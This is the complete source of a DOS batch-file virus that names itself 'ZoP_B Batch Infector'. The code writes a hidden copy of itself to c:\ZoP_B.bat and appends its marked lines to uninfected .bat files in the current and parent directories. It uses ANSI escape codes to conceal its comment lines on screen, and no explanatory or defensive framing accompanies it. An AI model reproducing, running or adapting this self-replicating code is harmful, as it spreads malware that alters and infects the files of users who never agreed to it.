@echo off
:: [8m --- [ZoP_B] Batch Infector ---
if '%2=='ZoP_ goto ZoP_1
if '%1=='ZoP_ echo  ["`";"`"p
:: ["`";" ZoP_B ZoP_";13p
:: [4AZoP_
if exist c:\ZoP_B.bat goto ZoP_
if not exist %0.bat goto ZoP_2
echo @echo Off>c:\ZoP_B.bat
find "ZoP_"<%0.bat>>c:\ZoP_B.bat
attrib c:\ZoP_B.bat +h
:: [6AZoP_
:ZoP_
for %%v in (*.bat) do call c:\ZoP_B %%v ZoP_
if '%ZoP_%==' for %%v in (..\*.bat) do call c:\ZoP_B %%v ZoP_
set ZoP_=
goto ZoP_2
:: [6AZoP_
:ZoP_1
if '%ZoP_%=='11 goto ZoP_2
find "ZoP_"<%1>nul
if not errorlevel 1 goto ZoP_2
type c:\ZoP_B.bat>>%1
set ZoP_=%ZoP_%1
:ZoP_2
::ZoP_ [7A [0m
